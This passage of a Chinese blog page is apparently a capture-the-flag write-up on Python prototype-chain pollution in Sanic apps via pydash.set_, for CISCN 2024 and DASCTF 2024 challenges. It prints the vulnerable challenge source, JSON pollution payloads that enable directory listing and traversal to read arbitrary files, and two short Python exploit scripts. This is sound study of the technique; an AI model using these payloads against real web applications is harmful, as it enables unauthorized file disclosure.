+<p>我们回到DirectoryHandler类中</p>
+<p><img src="../images/3181170-20240522002809565-592733315.png" alt="img" /></p>
+<p>可以看到这里是获取一个Path对象我们跟进Path对象里<br />
+<a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202405/3181170-20240522002819475-159467452.png"><img src="../images/3181170-20240522002819475-159467452.png" alt="img" /></a></p>
+<p>可以看到parts的值最后是给了_parts这个属性，我们访问这个属性看看:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/src?gxngxngxn=print(app.router.name_index[&#x27;__mp_main__.static&#x27;].handler.keywords[&#x27;directory_handler&#x27;].directory._parts)</span><br></pre></td></tr></table></figure>
+<p><img src="../images/3181170-20240522002843432-1244932673.png" alt="img" /></p>
+<p>看到这是一个list,那么这里很明显我们就可以直接污染了</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;/&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>完整EXP:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://8fd459c5-81dc-4644-add1-991e14938de0.challenge.ctf.show/&#x27;</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">s.cookies.update(&#123;</span><br><span class="line">    <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;&quot;adm\\073n&quot;&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">s.get(url + <span class="string">&#x27;/login&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启目录浏览</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>: <span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\.static.handler.keywords.directory_handler.directory_view&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 污染目录路径</span></span><br><span class="line"><span class="comment"># data = &#123;&quot;key&quot;: &quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\.static.handler.keywords.directory_handler.directory._parts&quot;, &quot;value&quot;: [&#x27;/&#x27;]&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># r = s.post(url + &#x27;/admin&#x27;, json=data)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取flag路径</span></span><br><span class="line"><span class="comment"># r = s.get(url + &#x27;/static/&#x27;)</span></span><br><span class="line"><span class="comment"># print(r.text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 污染__file__，读取flag</span></span><br><span class="line"><span class="comment"># data = &#123;&quot;key&quot;: &quot;__class__\\\\.__init__\\\\.__globals__\\\\.__file__&quot;, &quot;value&quot;: &quot;/24bcbd0192e591d6ded1_flag&quot;&#125;</span></span><br><span class="line"><span class="comment">#r = s.post(url + &#x27;/admin&#x27;, json=data)</span></span><br><span class="line"><span class="comment">#print(r.text)</span></span><br><span class="line"><span class="comment">#print(s.get(url + &#x27;/src&#x27;).text)</span></span><br></pre></td></tr></table></figure>
+<p>但这里也不知道我为什么会爆500</p>
+<p>反正后面的流程差不多是</p>
+<p><img src="../images/file-20250410114008260.png" alt="img" /></p>
+<p>然后污染file就行了</p>
+<h3 id="dasctf-2024暑期挑战赛sanics-revenge没懂"><a class="markdownIt-Anchor" href="#dasctf-2024暑期挑战赛sanics-revenge没懂"></a> DASCTF 2024暑期挑战赛Sanic’s revenge（没懂）</h3>
+<p>具体看<a target="_blank" rel="noopener" href="https://www.cnblogs.com/gxngxngxn/p/18290489">DASCTF 2024暑期挑战赛-WEB-Sanic’s revenge gxngxngxn - gxngxngxn - 博客园</a>，看得我左眼瞪右眼直接升天</p>
+<h4 id="分析"><a class="markdownIt-Anchor" href="#分析"></a> 分析</h4>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的源码好像被admin删掉了一些，听他说里面藏有大秘密</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/*****secret********&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">request</span>):</span><br><span class="line">    secret=<span class="string">&#x27;**************************&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> text(<span class="string">&quot;can you find my route name ???&quot;</span>+secret)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> html(<span class="built_in">open</span>(<span class="string">&#x27;static/index.html&#x27;</span>).read())</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pollute&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">POLLUTE</span>(<span class="params">request</span>):</span><br><span class="line">    key = request.json[<span class="string">&#x27;key&#x27;</span>]</span><br><span class="line">    value = request.json[<span class="string">&#x27;value&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">and</span> value <span class="keyword">and</span> <span class="built_in">type</span>(key) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">and</span> <span class="string">&#x27;parts&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> key <span class="keyword">and</span> <span class="string">&#x27;proc&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">str</span>(value) <span class="keyword">and</span> <span class="built_in">type</span>(value) <span class="keyword">is</span> <span class="keyword">not</span> <span class="built_in">list</span>:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;success&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log_dir = create_log_dir(<span class="number">6</span>)</span><br><span class="line">        log_dir_bak = log_dir + <span class="string">&quot;..&quot;</span></span><br><span class="line">        log_file = <span class="string">&quot;/tmp/&quot;</span> + log_dir + <span class="string">&quot;/access.log&quot;</span></span><br><span class="line">        log_file_bak = <span class="string">&quot;/tmp/&quot;</span> + log_dir_bak + <span class="string">&quot;/access.log.bak&quot;</span></span><br><span class="line">        log = <span class="string">&#x27;key: &#x27;</span> + <span class="built_in">str</span>(key) + <span class="string">&#x27;|&#x27;</span> + <span class="string">&#x27;value: &#x27;</span> + <span class="built_in">str</span>(value);</span><br><span class="line">        <span class="comment"># 生成日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="comment"># 备份日志文件</span></span><br><span class="line">        os.system(<span class="string">&quot;mkdir /tmp/&quot;</span> + log_dir_bak)</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(log_file_bak, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(log)</span><br><span class="line">        <span class="keyword">return</span> text(<span class="string">&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>这个题算是CISCN2024的一个延申</p>
+<p>我们继续看DirectoryHandler类中handle方法中的逻辑:</p>
+<p><img src="../images/3181170-20240708180657611-846919114.png" alt="img" /></p>
+<p>当我们开启列目录功能后，就会进入：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="variable language_">self</span>._index(</span><br><span class="line">    <span class="variable language_">self</span>.directory / current, path, request.app.debug</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<p>调用<code>_index</code>方法，我们跟进<code>_index</code>方法:</p>
+<p><img src="../images/3181170-20240708180710866-1079050417.png" alt="img" /></p>
+<p>很明显这里就是对我们传入的目录路径的处理,我们打个断点调试一下:</p>
+<p>我们先访问static路由</p>
+<p><img src="../images/3181170-20240708180732101-449418681.png" alt="img" /></p>
+<p>可以看到这里列出的目录路径就是由self.directory(这玩意是个对象，这里的值是其中的parts控制的)+current拼接得到的，</p>
+<p>如果我能控制current的值，例如为&quot;…&quot;，那这样不就可以实现目录穿越，直接列出上层目录下的文件了嘛</p>
+<p>那么current是哪来的呢?</p>
+<p><img src="../images/3181170-20240708180744335-906623566.png" alt="img" /></p>
+<p>解释：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">从给定的路径中去除基本路径（`self.base`），然后返回剩余路径。首先，`path.strip(&quot;/&quot;)` 去除路径两端的斜杠，然后`[len(self.base):]` 取基本路径之后的部分，最后`.strip(&quot;/&quot;)` 再次去除剩余路径两端的斜杠</span><br><span class="line"></span><br><span class="line">#可以看到current的值就是由path和base两个值决定的</span><br></pre></td></tr></table></figure>
+<p>那么现在我们就看是否能控制path和self.base的值了</p>
+<p><img src="../images/3181170-20240708180756642-1522979461.png" alt="img" /></p>
+<p>可以看到我们访问static路由时，这里path的值是/static/</p>
+<p>那么很明显这里的值就是我们<strong>网页访问的路径</strong>了，所以可控</p>
+<p><img src="../images/3181170-20240708180808856-1540919111.png" alt="img" /></p>
+<p>这玩意一看就是自身的属性，想都不用想，随便污染的，也可控</p>
+<p>此时current的值为：</p>
+<p><img src="../images/3181170-20240708180821097-1424186522.png" alt="img" /></p>
+<p>所以我们此时列的目录仅仅只是:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\86183\PycharmProjects\pythonProject1\venv\static</span><br></pre></td></tr></table></figure>
+<p>如果我们手动修改current的值为<code>..</code>，那么会发生什么?</p>
+<p><img src="../images/3181170-20240708180842227-1568360038.png" alt="img" /></p>
+<p>可以看到此时成功穿越到上层目录了，列出了上层目录venv下的内容</p>
+<h4 id="file_or_directory"><a class="markdownIt-Anchor" href="#file_or_directory"></a> file_or_directory</h4>
+<p>file_or_directory类似flask中的_static_url_path，可以改变静态文件的默认路径</p>
+<p>我们只需要通过这个改变到其他目录，该目录下存在其他目录不就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=&#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;,&quot;value&quot;: &quot;C:\\Users\\&quot;&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h4>
+<p>/pollute路由提供了一个污染点pydash.set_，通过传参key和value可以实现原型链污染。此外这个路由还设置了一个waf，如果触发了waf，就会将key和value的值写入/tmp目录下的文件中</p>
+<p>还存在一个未知名称的路由，我们可以猜测里面放了secret ？？？</p>
+<p>根据提示可以发现，这里的源码并不完整，所以我们需要得到完整的源码</p>
+<p>这里的入口点就是原型链污染，我们污染file_or_directory到根目录下，就可以实现任意文件读取</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202407/3181170-20240708181015089-2065694026.png"><img src="../images/3181170-20240708181015089-2065694026.png" alt="img" /></a></p>
+<p>我们接着想办法获取源代码文件名,尝试访问/static/proc/1/cmdline:</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202407/3181170-20240708181025744-1432753833.png"><img src="../images/3181170-20240708181025744-1432753833.png" alt="img" /></a></p>
+<p>接着访问/start.sh:</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202407/3181170-20240708181037769-109133758.png"><img src="../images/3181170-20240708181037769-109133758.png" alt="img" /></a></p>
+<p>得到源码名称:2Q17A58T9F65y5i8.py</p>
+<p>访问/app/2Q17A58T9F65y5i8.py,得到完整源码:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line">from sanic import Sanic</span><br><span class="line">import os</span><br><span class="line">from sanic.response import text, html</span><br><span class="line">import sys</span><br><span class="line">import random</span><br><span class="line">import pydash</span><br><span class="line"></span><br><span class="line"># pydash==5.1.2</span><br><span class="line"></span><br><span class="line">#源码好像被admin删掉了一些，听他说里面藏有大秘密</span><br><span class="line">class Pollute:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def create_log_dir(n):</span><br><span class="line">        ret = &quot;&quot;</span><br><span class="line">        for i in range(n):</span><br><span class="line">            num = random.randint(0, 9)</span><br><span class="line">            letter = chr(random.randint(97, 122))</span><br><span class="line">            Letter = chr(random.randint(65, 90))</span><br><span class="line">            s = str(random.choice([num, letter, Letter]))</span><br><span class="line">            ret += s</span><br><span class="line">        return ret</span><br><span class="line">        </span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(&quot;/static/&quot;, &quot;./static/&quot;)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/Wa58a1qEQ59857qQRPPQ&quot;)</span><br><span class="line">async def secret(request):</span><br><span class="line">    with open(&quot;/h111int&quot;,&#x27;r&#x27;) as f:</span><br><span class="line">       hint=f.read()</span><br><span class="line">    return text(hint)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def index(request):</span><br><span class="line">    return html(open(&#x27;static/index.html&#x27;).read())</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/adminLook&quot;, methods=[&#x27;GET&#x27;])</span><br><span class="line">async def AdminLook(request):</span><br><span class="line">    #方便管理员查看非法日志</span><br><span class="line">    log_dir=os.popen(&#x27;ls /tmp -al&#x27;).read();</span><br><span class="line">    return text(log_dir)</span><br><span class="line">    </span><br><span class="line">@app.route(&quot;/pollute&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">async def POLLUTE(request):</span><br><span class="line">    key = request.json[&#x27;key&#x27;]</span><br><span class="line">    value = request.json[&#x27;value&#x27;]</span><br><span class="line">    if key and value and type(key) is str and &#x27;parts&#x27; not in key and &#x27;proc&#x27; not in str(value) and type(value) is not list:</span><br><span class="line">        pollute = Pollute()</span><br><span class="line">        pydash.set_(pollute, key, value)</span><br><span class="line">        return text(&quot;success&quot;)</span><br><span class="line">    else:</span><br><span class="line">        log_dir=create_log_dir(6)</span><br><span class="line">        log_dir_bak=log_dir+&quot;..&quot;</span><br><span class="line">        log_file=&quot;/tmp/&quot;+log_dir+&quot;/access.log&quot;</span><br><span class="line">        log_file_bak=&quot;/tmp/&quot;+log_dir_bak+&quot;/access.log.bak&quot;</span><br><span class="line">        log=&#x27;key: &#x27;+str(key)+&#x27;|&#x27;+&#x27;value: &#x27;+str(value);</span><br><span class="line">        #生成日志文件</span><br><span class="line">        os.system(&quot;mkdir /tmp/&quot;+log_dir)</span><br><span class="line">        with open(log_file, &#x27;w&#x27;) as f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        #备份日志文件</span><br><span class="line">        os.system(&quot;mkdir /tmp/&quot;+log_dir_bak)</span><br><span class="line">        with open(log_file_bak, &#x27;w&#x27;) as f:</span><br><span class="line">             f.write(log)</span><br><span class="line">        return text(&quot;！！！此地禁止胡来，你的非法操作已经被记录！！！&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+<p>可以看到多出来的路由:Wa58a1qEQ59857qQRPPQ，我们直接访问得到hint：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flag in /app,but you need to find his name！！！</span><br><span class="line">Find a way to see the file names in the app directory</span><br></pre></td></tr></table></figure>
+<p>这里提示我们flag文件在app目录下，只是不知道flag名字</p>
+<p>那么很明显我们需要想办法列出app目录下的文件</p>
+<p>还看到adminLook路由可以看到/tmp目录下的文件，而我们的非法日志就记录在此目录下，我们先随便触发一次非法记录,接着访问adminLook路由:</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202407/3181170-20240708181050817-1277846009.png"><img src="../images/3181170-20240708181050817-1277846009.png" alt="img" /></a></p>
+<p>可以看到这里存在两个目录，一个备份目录名称为ddahJ6…，那么就可以利用访问这个目录实现穿越到上层目录：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/tmp&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>首先切换到tmp目录下，再污染base的值:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="string">&quot;static/ddahJ6&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>同时记得开启列目录功能:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;key&quot;</span><span class="punctuation">:</span><span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;</span><span class="punctuation">,</span><span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> True<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<p>接着访问即可:</p>
+<p><a target="_blank" rel="noopener" href="https://img2024.cnblogs.com/blog/3181170/202407/3181170-20240708181104472-1088645941.png"><img src="../images/3181170-20240708181104472-1088645941.png" alt="img" /></a></p>
+<p>可以看到flag名称，接着访问/app/45W698WqtsgQT1_flag即可得到flag</p>
+<p>下面给出exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#开启列目录</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory_view&quot;,&quot;value&quot;: True&#125;</span></span><br><span class="line"><span class="comment">#将目录设置在根目录下</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.directory._parts&quot;,&quot;value&quot;: &quot;/&quot;&#125;</span></span><br><span class="line"><span class="comment">#修改默认路径</span></span><br><span class="line">data=&#123;<span class="string">&quot;key&quot;</span>:<span class="string">&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.file_or_directory&quot;</span>,<span class="string">&quot;value&quot;</span>: <span class="string">&quot;/&quot;</span>&#125;</span><br><span class="line"><span class="comment">#构造current</span></span><br><span class="line"><span class="comment">#data = &#123;&quot;key&quot;:&quot;__class__\\\\.__init__\\\\.__globals__\\\\.app.router.name_index.__mp_main__\\.static.handler.keywords.directory_handler.base&quot;,&quot;value&quot;: &quot;static/fJBkhI&quot;&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">response = requests.post(url=<span class="string">&#x27;url&#x27;</span>, json=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">python原型链污染</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          <img data-src="/../images/1737907114de8a.jpg" data-sizes="auto" alt="[羊城杯 2020]EasySer" class="lazyload">
+        
+        <a href="/2025/05/07/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5DEasySer/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [羊城杯 2020]EasySer
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/124691006_p0_master1200.jpg" data-sizes="auto" alt="[EIS 2019]EzPOP" class="lazyload">
+        
+      
+      <a href="/2025/05/06/%5BEIS%202019%5DEzPOP/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [EIS 2019]EzPOP
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2026
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        1227.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        97:36
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
